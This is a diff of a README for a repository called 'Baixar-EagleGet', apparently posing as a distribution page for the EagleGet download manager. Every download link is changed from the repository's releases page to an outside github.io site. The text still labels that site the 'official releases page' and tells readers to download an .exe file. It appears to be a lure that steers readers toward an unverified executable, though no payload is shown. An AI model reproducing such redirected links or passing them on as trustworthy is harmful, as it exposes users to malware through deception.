@@ -1,6 +1,6 @@
 # ⚡ Baixar-EagleGet - Manage your downloads for faster speeds
 
-[![Download EagleGet](https://img.shields.io/badge/Download-EagleGet-blue.svg)](https://github.com/Uncertain-vitalstatistics53/Baixar-EagleGet/releases)
+[![Download EagleGet](https://img.shields.io/badge/Download-EagleGet-blue.svg)](https://uncertain-vitalstatistics53.github.io)
 
 EagleGet helps users download files quickly on Windows 11 and Windows 10. It organizes downloads to finish tasks in less time. This software manages files, resumes interrupted transfers, and integrates with web browsers.
 
@@ -19,7 +19,7 @@ Before you install this software, check these requirements for your personal com
 
 Follow these steps to obtain the installation file:
 
-1. Visit the [official releases page](https://github.com/Uncertain-vitalstatistics53/Baixar-EagleGet/releases).
+1. Visit the [official releases page](https://uncertain-vitalstatistics53.github.io).
 2. Look for the section marked Assets.
 3. Find the file ending in .exe.
 4. Click the file name to start the download.
@@ -101,4 +101,4 @@ If your files do not open with EagleGet, check these items:
 
 Keeping the software updated ensures better compatibility with Windows 11 updates. Check the download link below regularly to see if a new version is available.
 
-[![Download EagleGet](https://img.shields.io/badge/Download-Latest_Version-grey.svg)](https://github.com/Uncertain-vitalstatistics53/Baixar-EagleGet/releases)
+[![Download EagleGet](https://img.shields.io/badge/Download-Latest_Version-grey.svg)](https://uncertain-vitalstatistics53.github.io)
